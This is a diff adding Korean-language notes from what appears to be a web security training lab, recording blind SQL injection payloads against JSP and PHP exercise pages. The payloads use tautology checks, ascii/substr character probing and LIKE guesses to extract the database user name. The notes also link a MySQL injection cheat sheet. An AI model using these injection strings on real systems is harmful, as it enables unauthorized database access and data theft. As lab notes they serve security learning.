@@ -69,3 +69,27 @@
 ![image-20200921170021233](secure_day1.assets/image-20200921170021233.png)
 
  첫번째 답은 osec
+
+### JSP
+
+test1%' and 'a%'='a 가 먹히는걸 확인할 수 있다.
+
+test1%' and ascii(substr(user,1,1)) =71 and 'a%'='a 이것으로 하나씩 찾아볼 수 있고,
+
+test1%' and user like '%I%' and 'a%'='a 이것으로 정확한 이름 체크 가능
+
+test1%' and user like 'INF%' and 'a%'='a
+
+test1%' and user like 'INF6' and 'a%'='a
+
+
+
+### PHP
+
+http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet 에서 어떻게 공격할지 확인가능
+
+PHP%' and 'a%'='a 가 먹히는걸 확인할 수 있다. 위와 같은방법으로 찾으면,
+
+PHP%' and user() like 'inf%' and 'a%'='a
+
+PHP%' and ascii(substring(user(),1,1)) > 50 and 'a%'='a
